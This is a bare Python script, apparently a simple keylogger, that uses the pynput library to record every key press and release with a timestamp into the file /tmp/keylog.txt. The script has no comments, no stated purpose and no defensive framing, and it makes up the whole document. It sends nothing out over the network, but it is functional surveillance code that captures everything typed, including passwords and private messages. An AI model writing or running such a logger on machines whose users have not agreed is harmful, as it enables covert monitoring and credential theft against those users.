import pynput
import datetime

log_file = '/tmp/keylog.txt'

def on_press(key):
    with open(log_file, 'a') as f:
        f.write('{0} Key {1} pressed\n'.format(str(datetime.datetime.now()), str(key)))

def on_release(key):
    with open(log_file, 'a') as f:
        f.write('{0} Key {1} released\n'.format(str(datetime.datetime.now()), str(key)))

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
